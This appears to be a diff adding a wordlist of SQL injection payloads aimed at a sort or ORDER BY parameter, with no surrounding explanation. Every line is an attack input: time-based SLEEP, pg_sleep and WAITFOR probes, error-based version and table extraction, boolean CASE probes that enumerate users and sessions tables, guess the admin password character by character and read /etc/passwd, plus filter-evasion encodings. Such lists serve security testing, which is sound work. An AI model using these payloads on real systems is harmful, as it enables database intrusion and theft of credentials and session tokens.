@@ -1,0 +1,81 @@
+name
+1
+2
+3
+10
+100
+1,2
+name ASC
+name DESC
+name--
+name#
+name/*
+(1)
+(SELECT 1)
+name COLLATE utf8_general_ci
+(SELECT SLEEP(5))
+(SELECT(SLEEP(5)))
+(SELECT*FROM(SELECT(SLEEP(5)))a)
+(SELECT 1 FROM(SELECT SLEEP(5))v)
+name,(SELECT SLEEP(5))
+CASE WHEN 1=1 THEN name ELSE (SELECT SLEEP(5)END) END
+CASE WHEN 1=2 THEN name ELSE (SELECT SLEEP(5)END) END
+IF(1=1,SLEEP(5),name)
+IF(1=2,SLEEP(5),name)
+1 AND SLEEP(5)
+(SELECT(0)FROM(SELECT(SLEEP(5)))v)
+name||(SELECT SLEEP(5))||
+' AND SLEEP(5)--
+" AND SLEEP(5)--
+`; SELECT SLEEP(5)--
+(SELECT pg_sleep(5))
+'; SELECT pg_sleep(5)--
+1;WAITFOR DELAY '0:0:5'--
+name;WAITFOR DELAY '0:0:5'--
+CASE WHEN 1=1 THEN name ELSE price END
+CASE WHEN 1=2 THEN name ELSE price END
+CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN name ELSE price END
+CASE WHEN (SELECT COUNT(*) FROM users)=0 THEN name ELSE price END
+CASE WHEN (SELECT SUBSTRING(version(),1,1))='5' THEN name ELSE price END
+CASE WHEN (SELECT SUBSTRING(version(),1,1))='8' THEN name ELSE price END
+CASE WHEN (SELECT SUBSTRING(database(),1,1))='s' THEN name ELSE price END
+CASE WHEN (SELECT COUNT(*) FROM information_schema.tables)>10 THEN name ELSE price END
+CASE WHEN (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>5 THEN name ELSE price END
+extractvalue(1,concat(0x7e,version()))
+updatexml(1,concat(0x7e,version()),1)
+updatexml(1,concat(0x7e,database()),1)
+updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1)),1)
+(SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)
+(SELECT 1 FROM(SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)
+(SELECT CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables)))
+1
+1,2
+1,2,3
+(SELECT SLEEP(5))
+CASE WHEN 1=1 THEN name ELSE price END
+extractvalue(1,concat(0x7e,version()))
+sLeEp(5)
+SeLeCt(SlEeP(5))
+SE/**/LECT SLEEP(5)
+/*!SLEEP*/(5)
+/*!50000SLEEP*/(5)
+SLEEP/**/(5)
+(/*!SELECT*/ SLEEP(5))
+%53%4C%45%45%50(5)
+SLEEP(5)%09
+SLEEP(5)%0a
+SLEEP(5)%0d%0a
+0x534c454550(5)
+(char(115,108,101,101,112))(5)
+CASE WHEN (SELECT SUBSTRING(version(),1,1))='5' THEN name ELSE price END
+CASE WHEN (SELECT SUBSTRING(version(),1,1))='8' THEN name ELSE price END
+CASE WHEN (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='users')>0 THEN name ELSE price END
+CASE WHEN (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='slack_users')>0 THEN name ELSE price END
+CASE WHEN (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='sessions')>0 THEN name ELSE price END
+CASE WHEN (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users' AND column_name='password')>0 THEN name ELSE price END
+CASE WHEN (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='sessions' AND column_name='token')>0 THEN name ELSE price END
+CASE WHEN (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin' LIMIT 1)='a' THEN name ELSE price END
+CASE WHEN (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin' LIMIT 1)='b' THEN name ELSE price END
+CASE WHEN SUBSTRING(database(),1,1)='s' THEN name ELSE price END
+CASE WHEN (SELECT user())='root@localhost' THEN name ELSE price END
+CASE WHEN (SELECT LOAD_FILE('/etc/passwd')) IS NOT NULL THEN name ELSE price END
